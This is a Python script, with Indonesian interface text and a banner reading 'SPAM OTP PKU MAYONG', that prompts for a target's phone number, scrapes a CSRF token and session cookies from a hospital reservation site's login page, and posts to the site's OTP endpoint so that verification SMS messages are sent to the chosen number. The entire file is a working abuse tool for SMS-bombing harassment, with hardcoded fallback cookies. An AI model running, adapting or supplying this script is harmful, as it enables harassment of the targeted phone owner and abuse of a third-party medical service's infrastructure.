#!/usr/bin/env python3

import os
import sys
import json
import re
import subprocess
import time

os.system('clear')

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
W = '\033[97m'
C = '\033[96m'
N = '\033[0m'

print(f"""
{G}╔═╗┌─┐┌─┐┌┬┐  ╔╦╗┌─┐┬  ┌─┐┌─┐┌─┐┌┐┌
{G}╚═╗├─┘├─┤│││   ║ ├┤ │  ├┤ ├─┘│ ││││
{G}╚═╝┴  ┴ ┴┴ ┴   ╩ └─┘┴─┘└─┘┴  └─┘┘└┘
{W}╭────────────────────────────────────────────────────────────────╮
{W}│ {W}Developer {W}:{G} Rullzzz06,{W} Tools {W}: {G}SPAM OTP PKU MAYONG
{W}╰────────────────────────────────────────────────────────────────╯{N}
""")

nomor = input(f"{W}└─{G}❯{W} Masukkan nomor target: ").strip()

if not nomor:
    print(f"\n{R}✗ Nomor tidak boleh kosong!{N}")
    sys.exit(1)

if nomor.startswith('0'):
    phone = nomor
elif nomor.startswith('62'):
    phone = '0' + nomor[2:]
elif nomor.startswith('+62'):
    phone = '0' + nomor[3:]
else:
    phone = '0' + nomor

phone = ''.join(filter(str.isdigit, phone))

if not phone.startswith('0'):
    phone = '0' + phone

print(f"\n{G}[+] Target: {phone}{N}")
print(f"{Y}[+] Mengambil CSRF token...{N}")

# Step 1: Get CSRF token from login page
get_cmd = """curl -s -X GET 'https://reservasi.pkumayong.com/login' \
  -H 'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36'"""

result_get = subprocess.run(['bash', '-c', get_cmd], capture_output=True, text=True)

# Extract CSRF token
token_match = re.search(r'name="_token" value="([^"]+)"', result_get.stdout)
if not token_match:
    token_match = re.search(r'csrf_token[=:]\s*([^\s";]+)', result_get.stdout)
    if not token_match:
        print(f"\n{R}✗ Gagal mengambil CSRF token!{N}")
        sys.exit(1)

csrf_token = token_match.group(1)
print(f"{G}[+] CSRF Token: {csrf_token}{N}")

# Extract XSRF-TOKEN and laravel_session from cookies
xsrf_match = re.search(r'XSRF-TOKEN=([^;]+)', result_get.stdout)
session_match = re.search(r'laravel_session=([^;]+)', result_get.stdout)

if xsrf_match:
    xsrf_token = xsrf_match.group(1)
else:
    xsrf_token = "eyJpdiI6IlFydHpESGdLMTRCSFR2cmczOUE1b2c9PSIsInZhbHVlIjoiaks0WkgzMEtHVWlMZWY5ZXFlUHVkTmJ2cURNQmw5V0JkeThPcm9MY01jVzZXSUZzc1RQU2RQdnZMOW43NHc1YVBpeldxNVN6V2h6cUpReUZyQkNoeWc9PSIsIm1hYyI6IjM0YzY0NDI3NjE2MjZhMjBmYWQ4ODMzMDRjYTVmYzRlYThiMmEyNTljNjNmNzNjOTNkNmVhYzRkMDM0OGUzNmYifQ%3D%3D"

if session_match:
    session_token = session_match.group(1)
else:
    session_token = "eyJpdiI6ImFPYTl6djJpUGhYWjAxSGJpQThnWlE9PSIsInZhbHVlIjoiaExkQU02Q2diRnczM2RESzNxOTN3enBNYUdhOTRwYWNkSGpoK3ZpNm1QOUxJY3hBZ20yKzJMXC9yc0FReGRQUnlXSXBkS3dLSUxiMFNHelFNSmhpQ3FnPT0iLCJtYWMiOiJmY2IyYzYyYzAyZWE1NjlhYmUxZjlmMGJmNmQ4MTQ3MTMzNTBjMzA4Njc3MzYyYzQ1OTQxNzU5OTc3OTlhMjVhIn0%3D"

print(f"{G}[+] Sending OTP...{N}")

curl_cmd = f"""curl -s -X POST 'https://reservasi.pkumayong.com/reqOTP' \\
  -H 'host: reservasi.pkumayong.com' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: */*' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://reservasi.pkumayong.com' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://reservasi.pkumayong.com/login' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: XSRF-TOKEN={xsrf_token}; laravel_session={session_token}' \\
  -H 'priority: u=1, i' \\
  --data-raw '_token={csrf_token}&nohp={phone}'"""

result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

print("\n" + "="*60)
print(f"{C}[+] Response:{N}")
print("="*60)

if result.stdout:
    try:
        data = json.loads(result.stdout)
        print(json.dumps(data, indent=2))
        
        if data.get('success') or data.get('status') == 'success':
            print(f"\n{G}[✓] OTP Berhasil Dikirim!{N}")
        elif data.get('message') and 'otp' in str(data.get('message')).lower():
            print(f"\n{G}[✓] OTP Berhasil Dikirim!{N}")
        else:
            print(f"\n{R}[✗] Gagal!{N}")
    except:
        print(result.stdout)
        if 'success' in result.stdout.lower() or 'otp' in result.stdout.lower():
            print(f"\n{G}[✓] OTP Berhasil Dikirim!{N}")
        else:
            print(f"\n{R}[✗] Gagal!{N}")
else:
    print(f"{R}[✗] Tidak ada response!{N}")

print("="*60)
input(f"\n{W}Tekan Enter untuk keluar...{N}")
